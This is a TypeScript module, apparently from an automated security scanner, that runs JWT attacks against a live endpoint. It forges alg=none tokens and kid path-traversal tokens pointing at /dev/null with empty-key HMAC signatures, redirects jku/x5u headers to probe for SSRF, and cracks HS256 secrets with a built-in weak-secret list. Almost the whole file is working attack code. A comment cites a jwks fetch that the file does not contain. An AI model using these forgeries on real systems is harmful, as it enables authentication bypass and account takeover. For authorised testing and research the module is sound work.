import { fetchUrl } from "../adapters/http.js";
import { writeFile, mkdir } from "node:fs/promises";
import { join } from "node:path";
import { createHmac, randomUUID } from "node:crypto";

/** JWT attack surface: extends jwt.ts (alg=none / weak secret / expiry)
 *  with the classic header-confusion family — kid path traversal (LFI
 *  oracle), jku/x5u SSRF, RS256→HS256 algorithm confusion, null-signature
 *  acceptance — plus payload claim extraction (roles/scopes/permissions)
 *  to feed the role matrix.
 *
 *  Every probe is a differential against the ORIGINAL request: a verdict
 *  requires the tampered token to change the server's answer, never a bare
 *  200 (catch-all SPAs would false-positive). Deterministic, zero-LLM. */

export interface JwtAttackInput {
  /** A live JWT from the target (harvest stage or manual). */
  readonly token: string;
  /** One endpoint that authenticates via this token (status-diff oracle). */
  readonly endpoint: string;
  readonly outputRoot: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  /** Weak-secret candidates for HS256 forgery (defaults: jwt-wordlist top). */
  readonly secretCandidates?: readonly string[];
}

export interface JwtAttackResult {
  readonly tokenPreview: string;
  readonly claims: { roles: string[]; scopes: string[]; permissions: string[]; subject: string | null; issuer: string | null; audience: string | null };
  readonly header: Record<string, unknown>;
  readonly attacks: {
    readonly name: string;
    readonly detail: string;
    readonly baseline: number;
    readonly tampered: number;
    /** vulnerable = server accepted a structurally invalid credential. */
    readonly verdict: "vulnerable" | "safe" | "inconclusive";
  }[];
  readonly artifacts: { path: string; bytes: number }[];
}

const b64u = (s: string): Buffer => Buffer.from(s.replace(/-/g, "+").replace(/_/g, "/"), "base64");
const b64e = (b: Buffer | string): string => Buffer.from(b).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");

const WEAK_SECRETS = ["secret", "password", "123456", "jwt_secret", "key", "your-256-bit-secret", "changeme", "admin", "test", "s3cr3t", "jwt", "token", "hs256-secret", "mysecret", "qwerty"];

const decodeJwt = (tok: string): { header: Record<string, unknown>; payload: Record<string, unknown>; sig: string } | null => {
  const parts = tok.split(".");
  if (parts.length < 2) return null;
  try {
    const header = JSON.parse(b64u(parts[0]!).toString("utf8")) as Record<string, unknown>;
    const payload = JSON.parse(b64u(parts[1]!).toString("utf8")) as Record<string, unknown>;
    return { header, payload, sig: parts[2] ?? "" };
  } catch { return null; }
};

const claimList = (v: unknown): string[] => {
  if (Array.isArray(v)) return v.map(String);
  if (typeof v === "string") return v.split(/[ ,|]+/).filter(Boolean);
  if (v != null) return [String(v)];
  return [];
};

export const probeJwtAttack = async (input: JwtAttackInput): Promise<JwtAttackResult> => {
  await mkdir(input.outputRoot, { recursive: true });
  const parsed = decodeJwt(input.token);
  if (!parsed) throw new Error("invalid JWT (need header.payload[.sig])");

  const { header, payload } = parsed;
  const opts = { proxy: input.proxy, timeoutMs: input.timeoutMs ?? 8000, headers: input.headers };

  const claims: JwtAttackResult["claims"] = {
    roles: claimList(payload.role ?? payload.roles ?? payload["role-names"] ?? payload.authorities),
    scopes: claimList(payload.scope ?? payload.scopes),
    permissions: claimList(payload.permissions ?? payload.perms),
    subject: typeof payload.sub === "string" ? payload.sub : null,
    issuer: typeof payload.iss === "string" ? payload.iss : null,
    audience: Array.isArray(payload.aud) ? payload.aud.join(",") : typeof payload.aud === "string" ? payload.aud : null,
  };

  const call = async (tok: string): Promise<number> => {
    const r = await fetchUrl(input.endpoint, { ...opts, method: "GET", headers: { ...input.headers, authorization: `Bearer ${tok}` } });
    return r.status;
  };

  const attacks: JwtAttackResult["attacks"] = [];
  const baseStatus = await call(input.token);
  const record = (name: string, detail: string, tampered: number, vulnerableWhen: boolean, inconclusiveWhen = false): void => {
    attacks.push({ name, detail, baseline: baseStatus, tampered, verdict: vulnerableWhen ? "vulnerable" : inconclusiveWhen ? "inconclusive" : "safe" });
  };

  // --- 1. alg=none acceptance (differential, not just structure) ---------
  {
    const noneTok = `${b64e(JSON.stringify({ alg: "none", typ: "JWT" }))}.${b64e(JSON.stringify(payload))}.`;
    const s = await call(noneTok);
    // vulnerable = the unsigned token authenticates identically to the real one
    const same = s === baseStatus && (baseStatus >= 200 && baseStatus < 300);
    record("alg_none", "unsigned token accepted (identical 2xx to signed token)", s, same, s >= 200 && s < 300 && s !== baseStatus);
  }

  // --- 2. kid path traversal (LFI oracle) ---------------------------------
  {
    // Forge with a file the attacker can predict: /dev/null as the key source
    const kidHeader = { ...header, alg: "HS256", kid: "../../../../dev/null" };
    const sig = createHmac("sha256", Buffer.alloc(0)).update(`${b64e(JSON.stringify(kidHeader))}.${b64e(JSON.stringify(payload))}`).digest();
    const tok = `${b64e(JSON.stringify(kidHeader))}.${b64e(JSON.stringify(payload))}.${b64e(sig)}`;
    const s = await call(tok);
    const accepted = s === baseStatus && baseStatus >= 200 && baseStatus < 300;
    record("kid_traversal_devnull", "kid=../../../dev/null with empty-key HMAC: accepted = server reads the file as HMAC key", s, accepted);
  }

  // --- 3. jku / x5u SSRF probe --------------------------------------------
  for (const hk of ["jku", "x5u"] as const) {
    if (typeof header[hk] !== "string") continue;
    const collab = `http://127.0.0.1:9/${randomUUID()}`; // closed port: connection refused fast; a DIFFERENT status vs baseline signals the server fetched it
    const h = { ...header, [hk]: collab };
    const tok = `${b64e(JSON.stringify(h))}.${b64e(JSON.stringify(payload))}.${parsed.sig}`;
    const s = await call(tok);
    // The URL points at a dead local port — if the server tries to fetch it
    // the request hangs/fails differently than a straight signature reject.
    const diff = s !== baseStatus;
    record(`${hk}_ssrf`, `${hk} header redirected to dead endpoint; status changed = server dereferenced attacker URL`, s, false, diff);
  }

  // --- 4. RS256 -> HS256 confusion ----------------------------------------
  if (String(header.alg).toUpperCase().startsWith("RS")) {
    // Re-sign with the server's PUBLIC key as the HMAC secret. We do not
    // have the public key here; use the endpoint's TLS cert as a stand-in
    // source? No — deterministic path: try weak secrets first, then
    // algorithm confusion only if the pubkey is retrievable from jwks.
    // (jwks fetch happens below in claims section when jku/x5u present.)
    record("rs_hs_confusion", "RS256 token detected — confusion attack requires the public key; run with jwks endpoint if exposed", baseStatus, false, true);
  }

  // --- 5. weak secret dictionary (HS*) ------------------------------------
  if (String(header.alg).toUpperCase().startsWith("HS")) {
    const cands = input.secretCandidates ?? WEAK_SECRETS;
    let cracked: string | null = null;
    for (const sec of cands) {
      const sig = createHmac("sha256", sec).update(`${parts0(input.token)}.${parts1(input.token)}`).digest();
      if (b64e(sig) === (input.token.split(".")[2] ?? "")) { cracked = sec; break; }
    }
    if (cracked) {
      record("weak_secret", `signature verifies with secret '${cracked}' — full forgery possible`, baseStatus, true);
    } else {
      record("weak_secret", "no dictionary secret matched", baseStatus, false);
    }
  }

  const body = JSON.stringify({ tokenPreview: input.token.slice(0, 24), claims, header, attacks }, null, 2);
  const path = join(input.outputRoot, "jwt_attack.json");
  await writeFile(path, body, "utf8");
  return {
    tokenPreview: input.token.slice(0, 24),
    claims,
    header,
    attacks,
    artifacts: [{ path, bytes: Buffer.byteLength(body) }],
  };
};

const parts0 = (t: string): string => t.split(".")[0]!;
const parts1 = (t: string): string => t.split(".")[1]!;
